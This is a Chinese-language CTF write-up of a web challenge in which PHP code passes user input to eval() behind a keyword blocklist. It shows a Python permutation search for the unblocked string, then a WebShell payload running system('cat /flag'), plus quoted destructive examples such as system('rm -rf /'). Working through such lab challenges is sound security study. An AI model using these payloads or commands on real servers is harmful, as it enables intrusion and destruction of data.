---
title: 吾杯网络安全技能大赛[Web方向]-HelloHacker
date: 2024-21-2
tags:
 - CTF
 - WriteUP
categories:
 - 随笔 Essay 
isShowComments: true
publish: true








---

<Boxx/>

参加了第一届吾杯网络安全技能大赛，这是一道Web方向的签到题，这是我的第25题

[[toc]]

- 网址【[传送门](https://www.wucup.net/)】

| 题目编号 | 题目名称    | 题目方向 | 难度 |
| -------- | ----------- | -------- | ---- |
| 无       | HelloHacker | Web      | 简单 |

<!-- more -->

# 题目25：HelloHacker

### 题目描述：你看到的不一定是真的

### 考点：编程基础&WebShell

### 预期解：找到prohibited文件里缺失的排序，用WebShell控制服务器

进入靶机，我们看到页面中显示了一些PHP代码，我们需要做代码审计（本人薄弱项，需要加强php的学习）

![image-20241202201327701](/img/essay/image-20241202201327701.png)

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include_once 'check.php';
include_once 'ban.php';

$incompetent = $_POST['incompetent'];
$WuCup = $_POST['WuCup'];

if ($incompetent !== 'HelloHacker') {
    die('Come invade!');
}

$required_chars = ['p', 'e', 'v', 'a', 'n', 'x', 'r', 'o', 'z'];
$is_valid = true;

if (!checkRequiredChars($WuCup, $required_chars)) {
    $is_valid = false;
}

if ($is_valid) {

    $prohibited_file = 'prohibited.txt';
    if (file_exists($prohibited_file)) {
        $file = fopen($prohibited_file, 'r');
        
while ($line = fgets($file)) {
    $line = rtrim($line, "\r\n");  
    if ($line === '' && strpos($WuCup, ' ') === false) {
      
        continue;
    }
    if (stripos($WuCup, $line) !== false) {
        fclose($file);  
        die('this road is blocked');
    }
}
        fclose($file);  
    }

    eval($WuCup);
} else {
    die('NO！NO！NO！');
}

?>
Come invade!
```

我在看到代码后，因为对php代码的不熟悉，上了AI来阅读代码，算是作弊了，在未来公司的比赛环境中，应该是禁止连接外网的。

这段代码最关键的几个点

1. 引入了一个叫prohibited.txt的文件
2. 需要用POST方法传入incompetent和WuCup这两个参数
3. 在验证完是否含有pevanxroz，并和prohibited.txt的文件内容做了对比校验后，执行了eval()函数

阅读代码后，我们发现需要incompetent=HelloHacker，并且WuCup需要具有pevanxroz的所有字母，且和文件中任意一行“没有交集”即可

然后我们查看prohibited.txt的文件，这里需要特别仔细、认真的去观察这个文件，首先发现这个文件的符号部分是有空格的，这个有了空格，就会和我们的命令匹配不上，导致prohibited.txt这一行的屏蔽就是失败的（讲真的，这个真的很难很难发现，需要装一个显示空格的插件，才能在编辑器里发现这个空格）

![image-20241202213945140](/img/essay/image-20241202213945140.png)

其次，prohibited.txt这个文件的后半部分，是pevanxroz这段字符的各种排序，需要写段代码查找哪个排序方式没有被这个文件列出来

```python
# 导入itertools这个库 在这段代码中主要用于生成字符串的全排列
import itertools
# 找到当前路径，赋值给whereisi
whereisi = __file__[:__file__.rfind('\\')+1]
# 定义一个字符串，后续需要对这个字符串进行操作
string = 'erozxapvn'
# 用只读模式打开prohibited.txt
with open(whereisi + 'prohibited.txt', 'r') as f:
    # 读取每一行的内容赋值给lines，生成了一个列表[]
    lines = f.readlines()
    # 列表推导式 遍历每一行的每一个元素，并用strip去掉字符开头和结尾的空格 处理后重新赋值给lines
    lines = [i.strip() for i in lines]
    """
    测试string的所有排列方式，是否在文件中
    遍历 并且使用itertools的permutations方法 
    itertools.permutations(string, len(string)) 会生成字符串 string 的所有全排列组合
    排列的长度与原字符串长度相同。例如，如果 string 是 abc
    那么它会生成 ['abc', 'acb', 'bac', 'bca', 'cab', 'cba'] 这样的全排列列表。
    """
    for i in itertools.permutations(string, len(string)):
        # 每次循环，都会从生成的排列中取出一个来，重新赋值给i
        i = ''.join(i)
        # 设置一个循环，如果i不在这个lines列表里，就输出i
        if i not in lines:
            print(i)
            break
```

这个想法确实非常细致，确实要先去验证这个txt是否包含所有的排列方式，这种思维方式确实值得学习

运行代码，找到这个缺失的排序是orzexapvn（这个方法发现找到这个排序太慢了，等官方题解出了看看有没有更快 的方式）

根据没有被屏蔽的符号和函数，我们构造一下payload参数，向该地址发一个POST请求，参数为以下内容

```
?incompetent=HelloHacker
&WuCup=eval($_POST[0]);#oxzverapn
&0=system("cat /flag");
```

这段参数的意思是，我们先传入incompetent=HelloHacker让它符合起初的条件，然后传入一个WuCup，让他等于一个WebShell的木马，因为我们包含了oxzverapn，所以会通过校验，执行到之前php代码中提到的eval()函数的部分，最后我们让变量0执行一个system()的函数，这个system的函数主要用于执行服务器命令，通过cat命令查看flag文件内容。

> 1. eval () 函数
>    - 定义与功能
>      - `eval()`函数是 PHP 中的一个非常强大但也很危险的函数。它将传入的字符串作为 PHP 代码进行求值并执行。例如，`eval('echo "Hello, World!";');`会输出`Hello, World!`。这个函数可以动态地执行 PHP 代码，使得程序能够根据不同的条件或者用户输入来运行不同的代码片段。
>    - 应用场景
>      - **模板引擎**：在一些简单的模板引擎实现中，`eval()`函数可以用于将模板中的变量替换和代码片段动态地转换为可执行的 PHP 代码。例如，将模板中的`<?php echo $variable;?>`这样的代码片段替换为实际的变量值后，使用`eval()`函数来执行最终的输出逻辑。
>      - **代码生成与执行**：当需要根据用户的配置或者规则动态地生成并执行 PHP 代码时，`eval()`函数可以派上用场。比如，一个自定义的脚本语言解释器，可以将用户编写的自定义脚本转换为 PHP 代码字符串，然后使用`eval()`函数来执行。
>    - 安全风险
>      - **代码注入**：如果用户能够控制传入`eval()`函数的字符串，就可以注入恶意的 PHP 代码。例如，如果用户输入`eval($_GET['code']);`，攻击者就可以通过构造类似`http://example.com?code=system("rm -rf /");`这样的 URL 来删除服务器上的文件，这是非常危险的。所以在使用`eval()`函数时，必须对传入的内容进行严格的验证和过滤，确保其安全性。
> 2. system () 函数
>    - 定义与功能
>      - `system()`函数用于在 PHP 中执行外部命令，并输出命令执行后的结果。例如，`system('ls -l');`会在服务器上执行`ls -l`命令（列出当前目录下文件的详细信息），并将命令的结果输出到浏览器或者命令行终端（取决于 PHP 的运行环境）。它会创建一个子进程来执行指定的命令。
>    - 应用场景
>      - **系统管理任务**：在服务器端的 PHP 应用程序中，如果需要执行一些系统管理相关的任务，如备份数据库（`system('mysqldump -u root -p password database > backup.sql');`）、清理日志文件（`system('rm -rf /var/log/old_logs');`）等，可以使用`system()`函数。
>      - **与外部程序交互**：当 PHP 应用程序需要与外部的命令行工具或者其他程序进行交互时，`system()`函数可以用来调用这些程序并获取它们的输出。例如，调用一个图像处理工具来对服务器上的图像文件进行处理。
>    - 安全风险
>      - **命令注入**：和`eval()`函数类似，`system()`函数也存在严重的安全风险。如果用户能够控制传入`system()`函数的命令字符串，就可以执行任意的系统命令。例如，`system($_GET['command']);`这样的代码是非常危险的，攻击者可以通过构造恶意的 URL 来执行诸如删除文件、获取敏感信息等恶意操作。因此，在使用`system()`函数时，必须对用户输入的内容进行严格的过滤和验证，防止命令注入攻击。

![image-20241202214129014](/img/essay/image-20241202214129014.png)



### 原思路：

看到题目后，我尝试打开了check.php页面，发现只提示了Hacker have nothing you want here!

![image-20241202201359556](/img/essay/image-20241202201359556.png)

我用HackBar传了incompetent和WuCup这两个参数，一直在调整WuCup的内容，但没有想到是prohibited.txt的文件内容里，包含了大部分的符号，以及pevanxroz的大部分顺序（我做题时以为是所有顺序），导致用pevanxroz后边加了很多字符的方式，想通过校验，但一直失败了，没完成题目。